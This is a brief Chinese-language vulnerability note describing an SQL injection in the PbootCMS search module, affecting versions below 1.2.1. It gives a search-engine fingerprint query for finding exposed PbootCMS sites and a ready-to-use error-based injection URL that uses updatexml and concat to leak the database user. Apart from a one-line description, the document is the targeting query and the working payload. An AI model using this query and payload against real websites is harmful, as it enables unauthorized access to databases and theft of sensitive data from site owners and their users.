# PbootCMS search SQL注入漏洞

## 漏洞描述

PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

```
PbootCMS < 1.2.1
```

## 网络测绘 

```
app="PBOOTCMS"
```

## 漏洞复现

搜索框页面为

![](images/202202170924485.png)Payload为

```plain
/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123)
```

![](images/202202170924075.png)